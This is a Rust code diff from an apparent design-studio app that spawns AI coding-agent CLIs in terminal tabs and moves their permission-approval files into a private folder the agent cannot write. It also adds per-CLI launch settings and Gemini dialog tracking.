@@ -11,6 +11,7 @@
 #![allow(dead_code)]
 
 use crate::agent_session_failure::{self, BannerEvent, SessionFailure, SessionFailureClass};
+use crate::agent_session_files::ExactProjectConfig;
 use crate::agent_start_failure::{self, FixAction, StartFailure};
 use crate::icons::{self, Icon};
 use crate::panels::clipped;
@@ -254,7 +255,7 @@ impl AgentCliPreset {
                 "claude --dangerously-skip-permissions --mcp-config \"$DESIGNOS_MCP_CONFIG\" --settings \"$DESIGNOS_SESSION_DIR/hooks.json\" --append-system-prompt \"You are inside DESIGN:OS Studio bound exclusively to file '$DESIGNOS_DOC_NAME' (session $DESIGNOS_SESSION_DIR). Use the pre-fetched bootstrap context (or call designos_get_app_state) for the current selected page, frames, tokens, and components, and deliver all designs onto that file and page via designos-mcp tools (designos_apply_spec, designos_create_node, designos_update_node) or by writing NodeSpec JSON to $DESIGNOS_LIVE_SPEC.\""
             }
             (AgentCliPreset::Claude, PermissionMode::Ask) => {
-                "claude --mcp-config \"$DESIGNOS_MCP_CONFIG\" --settings \"$DESIGNOS_SESSION_DIR/hooks.json\" --append-system-prompt \"You are inside DESIGN:OS Studio bound exclusively to file '$DESIGNOS_DOC_NAME' (session $DESIGNOS_SESSION_DIR). Use the pre-fetched bootstrap context (or call designos_get_app_state) for the current selected page, frames, tokens, and components, and deliver all designs onto that file and page via designos-mcp tools (designos_apply_spec, designos_create_node, designos_update_node) or by writing NodeSpec JSON to $DESIGNOS_LIVE_SPEC.\""
+                "claude --mcp-config \"$DESIGNOS_CLAUDE_MCP_CONFIG\" --settings \"$DESIGNOS_CLAUDE_SETTINGS\" --setting-sources user --plugin-dir \"$DESIGNOS_CLAUDE_PLUGIN\" --append-system-prompt \"You are inside DESIGN:OS Studio bound exclusively to file '$DESIGNOS_DOC_NAME' (session $DESIGNOS_SESSION_DIR). Use the pre-fetched bootstrap context (or call designos_get_app_state) for the current selected page, frames, tokens, and components, and deliver all designs onto that file and page via designos-mcp tools (designos_apply_spec, designos_create_node, designos_update_node) or by writing NodeSpec JSON to $DESIGNOS_LIVE_SPEC.\""
             }
             (AgentCliPreset::Codex, PermissionMode::Skip) => concat!("codex --dangerously-bypass-approvals-and-sandbox", codex_mcp_overrides!()),
             (AgentCliPreset::Codex, PermissionMode::Ask) => concat!("codex", codex_mcp_overrides!()),
@@ -388,15 +389,24 @@ pub struct SessionEnv {
     pub doc_name: String,
     pub path_prepend: Vec<PathBuf>,
     pub tab_session_uuid: Option<String>,
+    /// Value of `DESIGNOS_CLAUDE_MCP_CONFIG`, which an Ask-mode Claude launch passes as `--mcp-config` (`None` in Skip mode).
+    pub claude_mcp_config: Option<String>,
+    /// Value of `DESIGNOS_CLAUDE_SETTINGS`, which an Ask-mode Claude launch passes as `--settings` (`None` in Skip mode).
+    pub claude_settings: Option<String>,
+    /// Value of `GEMINI_CLI_SYSTEM_DEFAULTS_PATH` for a Gemini tab: the private status-hooks file written for it. `None` when
+    /// there is none, and then the variable is left as Studio's own environment holds it.
+    pub gemini_system_defaults: Option<String>,
+    /// Value of `DESIGNOS_CLAUDE_PLUGIN`, which an Ask-mode Claude launch passes as `--plugin-dir` (`None` in Skip mode).
+    pub claude_plugin: Option<String>,
     #[cfg(test)]
     pub path_override: Option<std::ffi::OsString>,
 }
 
 impl SessionEnv {
-    #[allow(dead_code)]
+    #[cfg(test)]
     pub fn for_session_id(session_id: &str) -> Self {
         let clean = if session_id.trim().is_empty() { "tab-1" } else { session_id.trim() };
-        let session_dir = std::env::temp_dir().join("designos-sessions").join(clean);
+        let session_dir = crate::agent_session_files::ephemeral_session_dir(clean);
         Self {
             session_id: clean.to_string(),
             run_id: format!("{clean}-1-1"),
@@ -415,6 +425,10 @@ impl SessionEnv {
             doc_name: "Untitled".to_string(),
             path_prepend: Vec::new(),
             tab_session_uuid: None,
+            claude_mcp_config: None,
+            claude_settings: None,
+            claude_plugin: None,
+            gemini_system_defaults: None,
             #[cfg(test)]
             path_override: None,
         }
@@ -524,6 +538,11 @@ pub struct TerminalTab {
     /// When set, the PTY reader also reports an approval prompt in the output as `WaitingForInput` for a tab whose
     /// status otherwise comes from hook events: Antigravity in `Ask` mode has no permission hook (`#656`).
     pub pty_waiting_heuristic: Arc<std::sync::atomic::AtomicBool>,
+    /// What a Gemini CLI tab's confirmation dialog on screen says about its wait (`gemini_dialog`).
+    pub gemini: crate::gemini_dialog::GeminiTabState,
+    /// Bumped each time the screen changes: after the reader thread has fed a chunk to `parser`, and on a resize. A reader of the
+    /// screen that saw the same number last time has nothing new to read (`gemini_dialog`).
+    pub screen_rev: Arc<std::sync::atomic::AtomicU64>,
     /// Timestamp when the child process was first observed dead while waiting for `reader_eof`.
     pub exited_at: Option<std::time::Instant>,
     /// Per-tab ledger of agent canvas turns (`#677`).
@@ -536,8 +555,9 @@ pub struct TerminalTab {
     pub turn_tracker: crate::agent_turn_status::TabTurnTracker,
     /// Permission mode active when this tab was spawned (`#656`).
     pub permission_mode: crate::agent_permissions::AgentPermissionMode,
-    /// Per-tab approvals directory `<session_dir>/approvals/tab-<id>` (`#656`).
-    pub approvals_dir: PathBuf,
+    /// Per-tab approvals folder in the session's Studio-private channel (`agent_approval_channel`), where the tab's hook raises
+    /// requests and Studio answers them. `None` for a tab without a session, and when the platform has no private folder.
+    pub approvals_dir: Option<PathBuf>,
     /// Pending approval requests queued for this tab (`#656`).
     pub pending_approvals: Vec<crate::agent_permissions::ApprovalRequest>,
     /// Active stop sequence state (`#684`), or `None` when not stopping.
@@ -579,7 +599,7 @@ impl TerminalTab {
             return true;
         }
         self.permission_mode == crate::agent_permissions::AgentPermissionMode::Ask
-            && matches!(self.preset, AgentCliPreset::Codex | AgentCliPreset::Grok | AgentCliPreset::Antigravity)
+            && matches!(self.preset, AgentCliPreset::Codex | AgentCliPreset::Grok | AgentCliPreset::Antigravity | AgentCliPreset::Gemini)
             && self.agent_status.lock().ok().is_some_and(|g| matches!(*g, AgentTabStatus::WaitingForInput(_)))
     }
 
@@ -672,15 +692,16 @@ impl TerminalTab {
 
         if let Some(sess) = session {
             for lock_name in ["agent-events.jsonl.lock", "agent-status.jsonl.lock", "agent-status.json.lock"] {
-                let _ = std::fs::remove_dir_all(sess.session_dir.join(lock_name));
+                let _ = crate::agent_session_files::remove_session_dir_all(&sess.session_dir.join(lock_name));
             }
         }
-        let approvals_dir = session
-            .map(|s| crate::agent_permissions::tab_approvals_dir(&s.session_dir, id))
-            .unwrap_or_else(|| std::env::temp_dir().join(format!("designos-approvals-tab-{id}")));
+        // A new tab starts with an empty approvals folder: requests of an earlier run with the same id are not its own.
+        let approvals_dir = session.and_then(|s| crate::agent_approval_channel::tab_approvals_dir(&s.session_dir, id));
+        if let Some(sess) = session {
+            crate::agent_approval_channel::remove_tab_dir(&sess.session_dir, id);
+        }
         configure_pty_env_with_session(&mut cmd, preset, file_path, session);
         if session.is_some() {
-            cmd.env("DESIGNOS_APPROVALS_DIR", approvals_dir.as_os_str());
             cmd.env("DESIGNOS_TAB_ID", id.to_string());
         }
 
@@ -697,6 +718,7 @@ impl TerminalTab {
         let agent_status = Arc::new(Mutex::new(AgentTabStatus::Idle));
         let last_output_at = Arc::new(Mutex::new(None));
         let reader_eof = Arc::new(std::sync::atomic::AtomicBool::new(false));
+        let screen_rev = Arc::new(std::sync::atomic::AtomicU64::new(0));
         let pty_waiting_heuristic = Arc::new(std::sync::atomic::AtomicBool::new(false));
         let stop_in_flight = Arc::new(std::sync::atomic::AtomicBool::new(false));
 
@@ -706,6 +728,7 @@ impl TerminalTab {
         let status_bg = Arc::clone(&agent_status);
         let output_at_bg = Arc::clone(&last_output_at);
         let eof_bg = Arc::clone(&reader_eof);
+        let screen_rev_bg = Arc::clone(&screen_rev);
         let waiting_heuristic_bg = Arc::clone(&pty_waiting_heuristic);
         let slave_bg = Arc::downgrade(&slave);
         let stop_bg = Arc::clone(&stop_in_flight);
@@ -756,6 +779,8 @@ impl TerminalTab {
                                     p.process(clean_chunk.as_bytes());
                                 }
                             }
+                            // After the screen has the chunk: a reader that sees the new number reads a screen that has it.
+                            screen_rev_bg.fetch_add(1, std::sync::atomic::Ordering::Release);
                             if let Ok(mut log) = log_bg.lock() {
                                 log.push_str(&clean_chunk);
                                 if log.len() > MAX_RAW_LOG_BYTES {
@@ -815,6 +840,8 @@ impl TerminalTab {
             last_usage_status: None,
             reader_eof,
             pty_waiting_heuristic,
+            gemini: Default::default(),
+            screen_rev,
             exited_at: None,
             turn_ledger: crate::agent_turn_ledger::AgentTurnLedger::default(),
             unread: false,
@@ -960,6 +987,7 @@ impl TerminalTab {
         if let Ok(mut p) = self.parser.lock() {
             p.set_size(rows, cols);
         }
+        self.screen_rev.fetch_add(1, std::sync::atomic::Ordering::Release);
     }
 
     /// Writes raw bytes directly to the PTY master stdin, returning any I/O error.
@@ -1208,7 +1236,7 @@ pub struct TerminalState {
     pub path_override: Option<std::ffi::OsString>,
     /// How this terminal's session directory is keyed (`LibraryFile` vs `Fallback`).
     pub key: crate::agent_sessions::SessionKey,
-    /// Active Studio library root (`#652` / `#653`), retained even when the session falls back to `/tmp/designos-sessions/`.
+    /// Active Studio library root (`#652` / `#653`), retained even when the session falls back to the ephemeral folder under `<data dir>/designos/sessions/`.
     pub library_root: Option<PathBuf>,
     /// Persistent `sessions.json` registry for this session folder (`#653`).
     pub session_registry: crate::agent_sessions::SessionRegistry,
@@ -1260,7 +1288,7 @@ pub struct TerminalState {
     pub status_changes: Vec<(usize, AgentTabStatus)>,
     /// Permission mode for newly spawned agent tabs (`Skip` vs `Ask`, `#656`).
     pub permission_mode: crate::agent_permissions::AgentPermissionMode,
-    /// Queued in-panel approval requests read from `<session_dir>/approvals/` (`#656`).
+    /// Queued in-panel approval requests read from the active tab's private approvals folder (`#656`).
     pub pending_approvals: Vec<crate::agent_permissions::ApprovalRequest>,
     /// Latch ensuring at most one OS notification per waiting episode (`#656`).
     pub notification_latch: crate::agent_permissions::NotificationLatch,
@@ -1290,24 +1318,26 @@ pub struct TerminalState {
     session_closed: bool,
     /// Pauses the retry of a snapshot write that failed (`#690` edge case 5).
     write_backoff: crate::agent_session_files::WriteBackoff,
+    /// What the last provisioning moved out of the way of Grok or Antigravity, as a sentence for the Spawned line (`None` when nothing).
+    set_aside_note: Option<String>,
 }
 
 impl Default for TerminalState {
     fn default() -> Self {
+        // A test state has a tab id and a live-spec path of its own, so tests never see each other's session folder or spec.
         #[cfg(test)]
-        let tab_id = {
+        {
             use std::sync::atomic::{AtomicU64, Ordering};
             static NEXT_TEST_TAB_ID: AtomicU64 = AtomicU64::new(100_000);
-            NEXT_TEST_TAB_ID.fetch_add(1, Ordering::Relaxed)
-        };
-        #[cfg(not(test))]
-        let tab_id = 1;
-        let mut st = Self::for_tab(tab_id);
-        if cfg!(test) {
+            let mut st = Self::for_tab(NEXT_TEST_TAB_ID.fetch_add(1, Ordering::Relaxed));
             st.live_spec_path = st.session_dir.join("live-agent-out-test-isolated.spec.json");
-            st.last_watched_mtime = std::fs::metadata(&st.live_spec_path).and_then(|m| m.modified()).ok();
+            st.last_watched_mtime = spec_mtime(&st.live_spec_path);
+            st
         }
-        st
+        #[cfg(not(test))]
+        {
+            Self::for_tab(1)
+        }
     }
 }
 
@@ -1318,7 +1348,7 @@ impl Drop for TerminalState {
 }
 
 /// Agent session id of document tab `tab_id` in the Studio window `instance_id`
-/// (`/tmp/designos-sessions/<instance_id>-tab-<tab_id>`). A tab's session id is formed only here,
+/// (`<data dir>/designos/sessions/<instance_id>-tab-<tab_id>`). A tab's session id is formed only here,
 /// so the id a terminal is created with and the id the tab bar binds it to have one shape.
 pub fn tab_session_id(instance_id: &str, tab_id: u64) -> String {
     format!("{instance_id}-tab-{tab_id}")
@@ -1399,10 +1429,16 @@ fn page_context_json(session_id: &str, doc_name: &str, file_path: Option<&Path>,
     })
 }
 
+/// The modification time of the spec file `live-spec.json` of a session folder, taken from the file as it is opened (never from the
+/// target of a link). `None` for a missing file, a link and a FIFO.
+fn spec_mtime(path: &Path) -> Option<std::time::SystemTime> {
+    crate::agent_session_files::session_file_metadata(path).ok()?.modified().ok()
+}
+
 /// Tools the session's `mcp-config.json` enables: `None` when no custom list exists (every tool).
 /// `designos-mcp` reads the same file at start, so this is the set its `tools/list` exposes.
 fn session_enabled_tools(mcp_config_path: &Path) -> Option<std::collections::BTreeSet<String>> {
-    let raw = std::fs::read_to_string(mcp_config_path).ok();
+    let raw = crate::agent_session_files::read_session_text(mcp_config_path);
     designos_mcp::rules::reconcile_designos_block(raw.as_deref()).map(|custom| custom.enabled)
 }
 
@@ -1418,14 +1454,20 @@ fn session_rules_pack(enabled_tools: Option<&std::collections::BTreeSet<String>>
     }
 }
 
+// How often this thread read the saved permission mode from disk (tests count the reads of one spawn or resume).
+#[cfg(test)]
+thread_local! {
+    static MODE_READS: std::cell::Cell<usize> = const { std::cell::Cell::new(0) };
+}
+
 impl TerminalState {
     /// Creates an isolated `TerminalState` bound to document tab `tab_id` of this process
-    /// (`/tmp/designos-sessions/p<pid>-tab-{tab_id}`). A window's terminal is bound to its own
+    /// (`<data dir>/designos/sessions/p<pid>-tab-{tab_id}`). A window's terminal is bound to its own
     /// instance (`TabsState::session_id_for_tab`) before any shell starts in it.
     pub fn for_tab(tab_id: u64) -> Self {
         let session_id = tab_session_id(&format!("p{}", std::process::id()), tab_id);
         let active_run_id = format!("{session_id}-1-1");
-        let session_dir = std::env::temp_dir().join("designos-sessions").join(&session_id);
+        let session_dir = crate::agent_session_files::ephemeral_session_dir(&session_id);
         let live_spec_path = session_dir.join("live-spec.json");
         let live_doc_sync_path = session_dir.join("doc-sync.designos");
         let live_canvas_path = session_dir.join("canvas.designos");
@@ -1433,7 +1475,7 @@ impl TerminalState {
         let selection_spec_path = session_dir.join("selection.spec.json");
         let bootstrap_md_path = session_dir.join("bootstrap.md");
         let bootstrap_json_path = session_dir.join("bootstrap.json");
-        let initial_spec_mtime = std::fs::metadata(&live_spec_path).and_then(|m| m.modified()).ok();
+        let initial_spec_mtime = spec_mtime(&live_spec_path);
         let live_patch = crate::live_patch_log::LivePatchLog::bind(session_dir.join("doc-patch.jsonl"));
         let turn_marks = crate::agent_turn_marks::TurnMarkLog::bind(session_dir.join("turn-marks.jsonl"));
         let event_stream = crate::agent_turn_status::AgentEventStream::bind(session_dir.join("agent-events.jsonl"));
@@ -1538,6 +1580,7 @@ impl TerminalState {
             snapshot_worker: crate::agent_session_files::SnapshotWorker::new(),
             session_closed: false,
             write_backoff: crate::agent_session_files::WriteBackoff::default(),
+            set_aside_note: None,
         }
     }
 
@@ -1557,34 +1600,28 @@ impl TerminalState {
         self.active_tab().is_some_and(|t| t.needs_approval())
     }
 
-    fn withdraw_tab_approvals(session_dir: &Path, tab: &mut TerminalTab) {
-        crate::agent_permissions::withdraw_pending_requests_in_dir(&tab.approvals_dir);
-        for req in tab.pending_approvals.drain(..) {
-            let root_req = crate::agent_permissions::approvals_dir(session_dir).join(format!("{}.request.json", req.id));
-            if root_req.exists() {
-                let _ = crate::agent_permissions::write_approval_answer(session_dir, &req.id, crate::agent_permissions::ApprovalDecision::Withdrawn);
-            }
+    fn withdraw_tab_approvals(tab: &mut TerminalTab) {
+        if let Some(dir) = &tab.approvals_dir {
+            crate::agent_permissions::withdraw_pending_requests_in_dir(dir);
         }
+        tab.pending_approvals.clear();
     }
 
     fn sync_active_tab_approvals(&mut self) {
         self.pending_approvals = self.active_tab().map(|t| t.pending_approvals.clone()).unwrap_or_default();
     }
 
-    /// Writes `decision` (`Allow` or `Deny`) for `request_id` into the active tab's approvals folder
-    /// (and `<session_dir>/approvals/<id>.answer` if present) and removes the answered entry (`#656`).
+    /// Writes `decision` (`Allow` or `Deny`) for `request_id` into the active tab's private approvals folder, when the
+    /// request is still pending there, and removes the answered entry (`#656`). A folder the agent can write is never
+    /// read or written.
     pub fn answer_pending_approval(&mut self, request_id: &str, decision: crate::agent_permissions::ApprovalDecision) {
-        let mut wrote_tab = false;
         if let Some(tab) = self.active_tab_mut() {
-            if tab.approvals_dir.join(format!("{request_id}.request.json")).exists() {
-                let _ = crate::agent_permissions::write_approval_answer_in_dir(&tab.approvals_dir, request_id, decision);
-                wrote_tab = true;
+            if let Some(dir) = tab.approvals_dir.as_ref().filter(|dir| dir.join(format!("{request_id}.request.json")).exists()) {
+                if let Err(e) = crate::agent_permissions::write_approval_answer_in_dir(dir, request_id, decision) {
+                    eprintln!("design:os studio: could not write the approval answer for request {request_id}: {e}");
+                }
             }
             tab.pending_approvals.retain(|r| r.id != request_id);
-        }
-        let root_req = crate::agent_permissions::approvals_dir(&self.session_dir).join(format!("{request_id}.request.json"));
-        if !wrote_tab || root_req.exists() {
-            let _ = crate::agent_permissions::write_approval_answer(&self.session_dir, request_id, decision);
         }
         self.pending_approvals.retain(|r| r.id != request_id);
         if self.pending_approvals.is_empty() {
@@ -1624,8 +1661,10 @@ impl TerminalState {
             tab.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
         }
         let now = crate::agent_sessions::unix_timestamp_secs();
-        let approvals_dir = crate::agent_permissions::approvals_dir(&self.session_dir);
-        let _ = std::fs::create_dir_all(&approvals_dir);
+        let Some(approvals_dir) = self.active_tab().and_then(|tab| tab.approvals_dir.clone()) else {
+            return;
+        };
+        let _ = crate::agent_approval_channel::create_private_dir_all(&approvals_dir);
         match preset_slug {
             "agents-approval-command" => {
                 if let Some(tab) = self.active_tab_mut() {
@@ -1842,10 +1881,14 @@ impl TerminalState {
         self.selection_spec_path = session_dir.join("selection.spec.json");
         self.bootstrap_md_path = session_dir.join("bootstrap.md");
         self.bootstrap_json_path = session_dir.join("bootstrap.json");
+        // The folder being left takes its approval channel with it, unless a tab still runs on it.
+        if self.tabs.is_empty() && self.session_dir != session_dir {
+            crate::agent_approval_channel::remove_channel(&self.session_dir);
+        }
         self.session_dir = session_dir;
         // A reply a run left in the folder now bound (Studio quit before the prompt hook ran) must not reach this run's prompts.
         crate::skills::hook_delivery::remove_all_replies(&self.session_dir);
-        self.last_watched_mtime = std::fs::metadata(&self.live_spec_path).and_then(|m| m.modified()).ok();
+        self.last_watched_mtime = spec_mtime(&self.live_spec_path);
         self.live_patch = crate::live_patch_log::LivePatchLog::bind(self.session_dir.join("doc-patch.jsonl"));
         self.turn_marks = crate::agent_turn_marks::TurnMarkLog::bind(self.session_dir.join("turn-marks.jsonl"));
         self.event_stream = crate::agent_turn_status::AgentEventStream::bind(self.session_dir.join("agent-events.jsonl"));
@@ -1856,14 +1899,13 @@ impl TerminalState {
         self.bootstrap_generation.store(0, std::sync::atomic::Ordering::SeqCst);
         self.pending_approvals.clear();
         for tab in &mut self.tabs {
-            tab.approvals_dir = crate::agent_permissions::tab_approvals_dir(&self.session_dir, tab.id);
+            tab.approvals_dir = crate::agent_approval_channel::tab_approvals_dir(&self.session_dir, tab.id);
             tab.pending_approvals.clear();
         }
-        crate::agent_permissions::cleanup_stale_approvals(&self.session_dir, crate::agent_sessions::unix_timestamp_secs());
         self.last_agent_status_done = false;
     }
 
-    /// Re-binds this terminal state to `session_id` under `/tmp/designos-sessions/<session_id>`.
+    /// Re-binds this terminal state to `session_id` under `<data dir>/designos/sessions/<session_id>`.
     /// When already bound to a library file and holding its `session.lock`, updates `self.session_id`
     /// while preserving `<lib_root>/agent-sessions/<file_id>` as `self.session_dir`.
     pub fn bind_session(&mut self, session_id: &str) {
@@ -1875,7 +1917,7 @@ impl TerminalState {
             self.session_id = clean.to_string();
             self.active_run_id = format!("{clean}-1-{}", self.next_run_seq.max(1));
             if self.lock_owner.is_none() && self.tabs.is_empty() {
-                let fallback_dir = std::env::temp_dir().join("designos-sessions").join(clean);
+                let fallback_dir = crate::agent_session_files::ephemeral_session_dir(clean);
                 if self.session_dir != fallback_dir {
                     self.update_session_dir_paths(fallback_dir);
                 }
@@ -1885,14 +1927,14 @@ impl TerminalState {
         if self.session_id == clean {
             return;
         }
-        let session_dir = std::env::temp_dir().join("designos-sessions").join(clean);
+        let session_dir = crate::agent_session_files::ephemeral_session_dir(clean);
         self.session_id = clean.to_string();
         self.key = crate::agent_sessions::SessionKey::Fallback(clean.to_string());
         self.update_session_dir_paths(session_dir);
     }
 
     /// Binds this terminal state to `<lib_root>/agent-sessions/<file_id>/` (`#653`), acquiring
-    /// `session.lock` for `window_id` or falling back to `/tmp/designos-sessions/<window_id>` if
+    /// `session.lock` for `window_id` or falling back to `<data dir>/designos/sessions/<window_id>` if
     /// another live Studio window already holds the lock.
     pub fn bind_library_file(&mut self, lib_root: &Path, file_id: &str, window_id: &str) {
         self.bind_library_file_with_liveness(lib_root, file_id, window_id, crate::agent_sessions::is_pid_alive);
@@ -2009,6 +2051,8 @@ impl TerminalState {
     /// Skip never outlives the setting. Without a library the in-memory mode stays.
     fn refresh_permission_mode_from_disk(&mut self) {
         if let Some(root) = self.library_root.as_deref() {
+            #[cfg(test)]
+            MODE_READS.with(|reads| reads.set(reads.get() + 1));
             self.permission_mode = crate::agent_permissions::load_permission_mode(root);
         }
     }
@@ -2080,7 +2124,7 @@ impl TerminalState {
         }
     }
 
-    /// Detaches from any library file and binds to an ephemeral fallback `/tmp/designos-sessions/<session_id>`.
+    /// Detaches from any library file and binds to an ephemeral fallback `<data dir>/designos/sessions/<session_id>`.
     pub fn unbind_library_file(&mut self, session_id: &str) {
         let clean = if session_id.trim().is_empty() { self.session_id.clone() } else { session_id.trim().to_string() };
         let target_key = crate::agent_sessions::SessionKey::Fallback(clean.clone());
@@ -2118,6 +2162,10 @@ impl TerminalState {
             #[cfg(test)]
             path_override: self.path_override.clone(),
             tab_session_uuid: None,
+            claude_mcp_config: crate::agent_permissions::claude_mcp_config_value(&self.session_dir, self.permission_mode),
+            claude_settings: crate::agent_permissions::claude_settings_value(&self.session_dir, self.permission_mode),
+            claude_plugin: crate::agent_permissions::claude_plugin_value(&self.session_dir, self.permission_mode),
+            gemini_system_defaults: None,
         }
     }
 
@@ -2145,12 +2193,17 @@ impl TerminalState {
 
     /// Starts or restarts an agent run, advancing `run_id` so the next prompt / hook invocation
     /// delivers the 7-section `bootstrap.md` block once (`E15-16 §3.2`, `§10`).
-    pub fn reset_agent_run(&mut self, file_path: Option<&Path>) {
+    pub fn reset_agent_run(&mut self, file_path: Option<&Path>) -> Option<std::io::Error> {
+        self.reset_agent_run_exact(file_path, None)
+    }
+
+    /// [`Self::reset_agent_run`] for a tab of a CLI whose project config must be made exactly Studio's (`exact`).
+    fn reset_agent_run_exact(&mut self, file_path: Option<&Path>, exact: Option<crate::agent_session_files::ExactProjectConfig>) -> Option<std::io::Error> {
         self.run_id = self.run_id.saturating_add(1);
         self.last_bootstrap_key = None;
         self.bootstrap_markdown = None;
         self.bootstrap_job = None;
-        self.provision_session_agent_files(file_path);
+        self.provision_session_agent_files_exact(file_path, exact)
     }
 
     /// Spawns a background bootstrap build job (`E15-16 §3.2`, `§8.5`, `§11`) with a lazy
@@ -2192,7 +2245,7 @@ impl TerminalState {
         let job_gen = self.bootstrap_generation.fetch_add(1, std::sync::atomic::Ordering::SeqCst) + 1;
         let gen_bg = Arc::clone(&self.bootstrap_generation);
         let write_lock_bg = Arc::clone(&self.bootstrap_write_lock);
-        let _ = std::fs::remove_file(session_dir.join("bootstrap-context-reply.json"));
+        let _ = crate::agent_session_files::remove_session_file(&session_dir.join("bootstrap-context-reply.json"));
         std::thread::spawn(move || {
             let rules = session_rules_pack(enabled_bg.as_ref());
             if let Ok(_guard) = write_lock_bg.lock() {
@@ -2283,7 +2336,7 @@ impl TerminalState {
         if let Some(md) = &self.bootstrap_markdown {
             return md.clone();
         }
-        if let Ok(md) = std::fs::read_to_string(&self.bootstrap_md_path) {
+        if let Some(md) = crate::agent_session_files::read_session_text(&self.bootstrap_md_path) {
             self.bootstrap_markdown = Some(md.clone());
             return md;
         }
@@ -2449,6 +2502,7 @@ impl TerminalState {
                 agent_runtime: self.active_mcp_runtime_name().to_string(),
                 ask_mode: self.permission_mode == crate::agent_permissions::AgentPermissionMode::Ask,
                 unread_probe: Some(self.live_patch.unread_probe()),
+                exact_project_config: None,
             });
         }
 
@@ -2507,9 +2561,20 @@ impl TerminalState {
     /// Writes the session's agent files now, on the calling thread (an agent is about to start and reads them
     /// at once). A snapshot queued earlier carries the run id and permission mode of before this start, so it
     /// is dropped (or waited for, when already writing) and `last_synced_key` is cleared: the next sync queues
-    /// a fresh one instead of letting the stale one overwrite these files.
-    fn provision_session_agent_files(&mut self, file_path: Option<&Path>) {
+    /// a fresh one instead of letting the stale one overwrite these files. The first write that failed comes back.
+    fn provision_session_agent_files(&mut self, file_path: Option<&Path>) -> Option<std::io::Error> {
+        self.provision_session_agent_files_exact(file_path, None)
+    }
+
+    /// [`Self::provision_session_agent_files`] that also makes the project config of `exact` exactly Studio's, and then returns
+    /// the first error of that CLI's files.
+    fn provision_session_agent_files_exact(
+        &mut self,
+        file_path: Option<&Path>,
+        exact: Option<crate::agent_session_files::ExactProjectConfig>,
+    ) -> Option<std::io::Error> {
         self.snapshot_worker.cancel_and_wait();
+        self.set_aside_note = None;
         self.session_closed = false;
         self.write_backoff.clear();
         self.last_synced_key = None;
@@ -2533,8 +2598,15 @@ impl TerminalState {
             agent_runtime: self.active_mcp_runtime_name().to_string(),
             ask_mode: self.permission_mode == crate::agent_permissions::AgentPermissionMode::Ask,
             unread_probe: None,
+            exact_project_config: exact,
         };
-        let _ = write_session_agent_files_for_job(&job);
+        match write_session_agent_files(&job) {
+            Ok(note) => {
+                self.set_aside_note = note;
+                None
+            }
+            Err(e) => Some(e),
+        }
     }
 
     /// Screenshot fixture (`--panel agents-start-failure`): opens an Antigravity tab on a real
@@ -2667,12 +2739,16 @@ impl TerminalState {
     }
 
     /// Cancels/waits for any in-flight snapshot write and removes `self.session_dir` if it is an
-    /// ephemeral `/tmp/designos-sessions/<session_id>/` directory (never touching library
+    /// ephemeral `<data dir>/designos/sessions/<session_id>/` directory (never touching library
     /// `<lib_root>/agent-sessions/<file_id>/` folders or a scratch directory that still holds the
     /// only copy of a library file's session).
     fn cleanup_ephemeral_session_dir(&mut self) {
         self.snapshot_worker.cancel_and_wait();
         self.stop_bootstrap_writes();
+        // No tab is left to ask: the approval channel (hook script, requests, answers) goes with the session.
+        if self.tabs.is_empty() {
+            crate::agent_approval_channel::remove_channel(&self.session_dir);
+        }
         if crate::agent_session_files::is_ephemeral_session_dir(&self.session_dir) {
             if self.lock_owner.is_some() {
                 if let crate::agent_sessions::SessionKey::LibraryFile { ref lib_root, ref file_id } = self.key {
@@ -2703,7 +2779,9 @@ impl TerminalState {
     pub fn shutdown(&mut self) {
         // Skills waiting for a first prompt that never came must not reach a later prompt of this file (`#573`).
         self.delete_skills_replies();
-        crate::agent_permissions::withdraw_pending_requests(&self.session_dir);
+        for tab in &mut self.tabs {
+            Self::withdraw_tab_approvals(tab);
+        }
         self.pending_approvals.clear();
         let mut reg_dirty = false;
         let now = crate::agent_sessions::unix_timestamp_secs();
@@ -2842,9 +2920,14 @@ impl TerminalState {
     /// Spawns a custom CLI command tab (`"Other CLI…"` / `custom_clis`) in this file's session folder
     /// with the `DESIGNOS_*` environment, without registering a resumable session (`#652` §3 rule 7).
     pub fn spawn_custom_cli_tab(&mut self, label: &str, command: &str, file_path: Option<&Path>) -> Result<usize, String> {
+        let clean_title = if label.trim().is_empty() { command.trim() } else { label.trim() };
+        if let Err(e) = crate::agent_session_files::ensure_session_dir(&self.session_dir) {
+            let message = crate::agent_session_files::start_failure_message(clean_title, &e);
+            self.status_msg = Some(message.clone());
+            return Err(message);
+        }
         let id = self.next_tab_id.max(1);
         self.next_tab_id = id + 1;
-        let _ = std::fs::create_dir_all(&self.session_dir);
         self.provision_session_agent_files(file_path);
         let env = self.session_env();
         let mut cmd = build_agent_shell_cmd(&default_shell_program(), command);
@@ -2852,7 +2935,6 @@ impl TerminalState {
         isolate_zsh_from_home(&mut cmd);
         cmd.cwd(&self.session_dir);
 
-        let clean_title = if label.trim().is_empty() { command.trim() } else { label.trim() };
         match TerminalTab::spawn_with_session_cmd(id, AgentCliPreset::Claude, 28, 100, file_path, Some(&env), Some(cmd)) {
             Ok(mut tab) => {
                 tab.preset = AgentCliPreset::Shell;
@@ -2885,14 +2967,16 @@ impl TerminalState {
     /// Spawns a new tab with `preset` bound to this file's isolated [`SessionEnv`] and switches `active_tab` to it.
     /// For registrable agent CLIs, records a new entry in `sessions.json` (`#653`) and updates `last_cli` (`#652`).
     pub fn spawn_tab(&mut self, preset: AgentCliPreset, file_path: Option<&Path>) -> Result<usize, String> {
+        // One reading of the saved mode serves the launch command, the session files, the environment and the tab.
         self.refresh_permission_mode_from_disk();
+        let mode = self.permission_mode;
         if crate::agent_sessions::is_agent_cli_preset(preset) {
             let session_uuid =
                 if crate::agent_sessions::uses_preassigned_session_id(preset) { Some(crate::agent_sessions::generate_session_uuid()) } else { None };
-            let launch_cmd = crate::agent_permissions::build_new_session_command_for_mode(preset, self.permission_mode, session_uuid.as_deref());
-            self.spawn_tab_with_registration(preset, file_path, Some(&launch_cmd), session_uuid, false, None, true)
+            let launch_cmd = crate::agent_permissions::build_new_session_command_for_mode(preset, mode, session_uuid.as_deref());
+            self.spawn_tab_with_registration(preset, file_path, Some(&launch_cmd), session_uuid, false, None, true, mode)
         } else {
-            self.spawn_tab_with_registration(preset, file_path, None, None, false, None, false)
+            self.spawn_tab_with_registration(preset, file_path, None, None, false, None, false, mode)
         }
     }
 
@@ -2900,11 +2984,17 @@ impl TerminalState {
     /// `login`) instead of the preset's launch command and does not register in `sessions.json`.
     fn spawn_tab_running(&mut self, preset: AgentCliPreset, file_path: Option<&Path>, command: Option<&str>) -> Result<usize, String> {
         match command {
